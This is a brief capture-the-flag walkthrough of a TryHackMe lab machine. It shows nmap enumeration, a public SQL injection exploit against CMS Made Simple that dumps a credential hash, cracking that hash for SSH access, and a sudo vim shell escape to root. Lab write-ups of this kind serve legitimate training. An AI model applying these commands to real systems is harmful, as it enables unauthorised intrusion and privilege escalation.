# Simple CTF (THM)

- https://tryhackme.com/room/easyctf
- Feb 27, 2023
- easy

---

## Enumeration (nmap)

- ftp - vsftpd 3.0.3
  - Anonymous FTP login allowed
- http - Apache httpd 2.4.18 ((Ubuntu))
- ssh (2222) - OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)

### http

- robots.txt

```
User-agent: *
Disallow: /
Disallow: /openemr-5_0_1_3
# End of "$Id: robots.txt 3494 2003-03-19 15:37:44Z mike $".
```

- directory (ffuf)

```
simple
```

- found page cms made simple. (version 2.2.8)

### Vuln

- Unauthenticated SQL Injection on CMS Made Simple <= 2.2.9

```sh
searchsploit cms made simple
searchsploit -m php/webapps/46635.py
python2 46635.py http://10.10.33.97/simple/
```

```
[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
```

- https://www.dcode.fr/md5-hash
- password - `secret`

- with this credential enter ssh

```sh
ssh mitch@$IP -p 2222
```

- sudo -l

```
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim
```

- get root access

```sh
sudo vim -c ':!/bin/sh'
```
